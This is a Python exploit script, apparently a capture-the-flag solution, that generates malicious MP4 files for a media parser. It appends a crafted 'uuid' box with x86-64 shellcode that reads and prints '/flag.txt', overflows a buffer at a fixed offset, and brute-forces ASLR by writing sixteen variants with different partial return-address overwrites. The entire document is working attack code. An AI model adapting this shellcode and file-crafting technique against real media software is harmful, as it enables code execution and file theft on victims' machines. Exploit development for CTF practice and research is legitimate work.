from __future__ import annotations

import os
import struct
import subprocess
import sys
from pathlib import Path

target = bytes([
    0x44, 0x41, 0x4c, 0x43, 0x54, 0x46, 0x32, 0x30,
    0x32, 0x36, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
])

shell = bytes([
    0x31,0xc0,0xb0,0x02,0x48,0x8d,0x3d,0x32,0x00,0x00,0x00,0x31,
    0xf6,0x31,0xd2,0x0f,0x05,0x89,0xc7,0x31,0xc0,0x48,0x81,0xec,
    0x00,0x02,0x00,0x00,0x48,0x89,0xe6,0xba,0x00,0x01,0x00,0x00,
    0x0f,0x05,0x89,0xc2,0xb8,0x01,0x00,0x00,0x00,0xbf,0x01,0x00,
    0x00,0x00,0x0f,0x05,0xb8,0x3c,0x00,0x00,0x00,0x31,0xff,0x0f,
    0x05,0x2f,0x66,0x6c,0x61,0x67,0x2e,0x74,0x78,0x74,0x00,
])

offset = 0x118
jmp = 0x126f


def make_mp4(path: Path) -> bytes:
    cmd = [
        "ffmpeg", "-hide_banner", "-loglevel", "error", "-y",
        "-f", "lavfi",
        "-i", "color=size=16x16:duration=5:rate=1",
        "-t", "5",
        "-c:v", "libx264",
        "-pix_fmt", "yuv420p",
        str(path),
    ]
    subprocess.run(cmd, check=True)
    return path.read_bytes()


def uuid_box(payload: bytes) -> bytes:
    return struct.pack(">I", 24 + len(payload)) + b"uuid" + target + payload


def make_payload(page_nibble: int) -> bytes:
    low16 = ((page_nibble << 12) + jmp) & 0xffff
    return shell + b"A" * (offset - len(shell)) + struct.pack("<H", low16)


def main() -> None:
    if len(sys.argv) >= 2:
        base = Path(sys.argv[1]).read_bytes()
        outdir = Path(sys.argv[2]) if len(sys.argv) >= 3 else Path(".")
    else:
        outdir = Path(".")
        base = make_mp4(outdir / "base.mp4")

    outdir.mkdir(parents=True, exist_ok=True)
    for guess in range(16):
        data = base + uuid_box(make_payload(guess))
        out = outdir / f"pwn_{guess:x}.mp4"
        out.write_bytes(data)
        print(f"wrote {out} ({len(data)} bytes), ret low16=0x{((guess << 12) + jmp) & 0xffff:04x}")


if __name__ == "__main__":
    main()